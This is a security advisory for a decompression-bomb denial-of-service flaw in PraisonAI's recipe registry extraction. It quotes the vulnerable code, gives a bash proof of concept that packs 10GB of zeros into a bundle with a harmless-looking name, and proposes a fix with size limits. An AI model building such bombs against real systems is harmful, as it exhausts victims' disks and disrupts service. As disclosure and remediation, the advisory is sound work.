# [M] PraisonAI Vulnerable to Decompression Bomb DoS via Recipe Bundle Extraction Without Size Limits

## Summary
Severity: Medium
Advisory: GHSA-f2h6-7xfr-xm8w
CVE: CVE-2026-40148
CWE: CWE-409
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-f2h6-7xfr-xm8w
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.5.128

## Details
## Summary

The `_safe_extractall()` function in PraisonAI's recipe registry validates archive members against path traversal attacks but performs no checks on individual member sizes, cumulative extracted size, or member count before calling `tar.extractall()`. An attacker can publish a malicious recipe bundle containing highly compressible data (e.g., 10GB of zeros compressing to ~10MB) that exhausts the victim's disk when pulled via `LocalRegistry.pull()` or `HttpRegistry.pull()`.

## Details

The vulnerable function is `_safe_extractall()` at `src/praisonai/praisonai/recipe/registry.py:131-162`:

```python
def _safe_extractall(tar: tarfile.TarFile, dest_dir: Path) -> None:
    dest_resolved = dest_dir.resolve()
    for member in tar.getmembers():
        member_path = Path(member.name)
        # Reject absolute paths
        if member_path.is_absolute():
            raise RegistryError(...)
        # Reject '..' components
        if '..' in member_path.parts:
            raise RegistryError(...)
        # Reject resolved paths escaping dest_dir
        resolved = (dest_resolved / member_path).resolve()
        if not str(resolved).startswith(str(dest_resolved) + os.sep) and resolved != dest_resolved:
            raise RegistryError(...)
    # All members validated — safe to extract
    tar.extractall(dest_dir)  # <-- No size limit
```

The function iterates all tar members and checks for path traversal (absolute paths, `..` components, resolved path escaping), but never inspects `member.size`. The `TarInfo.size` attribute is available on every member and represents the uncompressed size, but it is never read.

This function is called from two locations:
- `LocalRegistry.pull()` at line 396-397
- `HttpRegistry.pull()` at line 791-792

The `publish()` method at line 296-298 only copies the compressed bundle via `shutil.copy2()`, so the bomb only detonates when a victim calls `pull()`.

No size limits, upload quotas, or decompression guards exist anywhere in the registry module.

## PoC

```bash
# Step 1: Create a malicious recipe bundle
mkdir bomb && cd bomb

cat > manifest.json << 'EOF'
{"name": "useful-recipe", "version": "1.0.0", "description": "Helpful AI recipe", "tags": ["ai"], "files": ["agent.yaml"]}
EOF

# Create a 10GB file of zeros (compresses to ~10MB with gzip)
dd if=/dev/zero of=agent.yaml bs=1M count=10240

# Bundle it as a .praison file
tar czf ../useful-recipe-1.0.0.praison manifest.json agent.yaml
cd ..

# Step 2: Publish to local registry (~10MB stored)
python -c "
from praisonai.recipe.registry import LocalRegistry
reg = LocalRegistry()
reg.publish('useful-recipe-1.0.0.praison')
"

# Step 3: Victim pulls — extracts 10GB to disk
python -c "
from praisonai.recipe.registry import LocalRegistry
reg = LocalRegistry()
reg.pull('useful-recipe')
"
# Result: 10GB+ written to disk, potential disk exhaustion
```

## Impact

- **Disk exhaustion:** A small compressed bundle (~10MB) can extract to 10GB+ of data, filling the victim's disk and causing denial of service for PraisonAI and potentially other applications on the same system.
- **No authentication required:** The local registry has no access controls on `publish()`, and HTTP registry bundles are fetched from remote servers that the attacker controls.
- **Silent detonation:** The extraction happens automatically during `pull()` with no progress indication or size warning to the user.

## Recommended Fix

Add a maximum extraction size limit to `_safe_extractall()`:

```python
MAX_EXTRACT_SIZE = 500 * 1024 * 1024  # 500MB
MAX_MEMBER_COUNT = 1000

def _safe_extractall(tar: tarfile.TarFile, dest_dir: Path) -> None:
    dest_resolved = dest_dir.resolve()
    members = tar.getmembers()
    
    if len(members) > MAX_MEMBER_COUNT:
        raise RegistryError(
            f"Archive contains too many members ({len(members)} > {MAX_MEMBER_COUNT})"
        )
    
    total_size = 0
    for member in members:
        member_path = Path(member.name)
        if member_path.is_absolute():
            raise RegistryError(
                f"Refusing to extract absolute path in archive: {member.name}"
            )
        if '..' in member_path.parts:
            raise RegistryError(
                f"Refusing to extract path traversal in archive: {member.name}"
            )
        resolved = (dest_resolved / member_path).resolve()
        if not str(resolved).startswith(str(dest_resolved) + os.sep) and resolved != dest_resolved:
            raise RegistryError(
                f"Refusing to extract path escaping target directory: {member.name}"
            )
        total_size += member.size
        if total_size > MAX_EXTRACT_SIZE:
            raise RegistryError(
                f"Archive extraction would exceed size limit "
                f"({total_size} > {MAX_EXTRACT_SIZE} bytes)"
            )
    tar.extractall(dest_dir)
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-f2h6-7xfr-xm8w
- https://nvd.nist.gov/vuln/detail/CVE-2026-40148
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.128
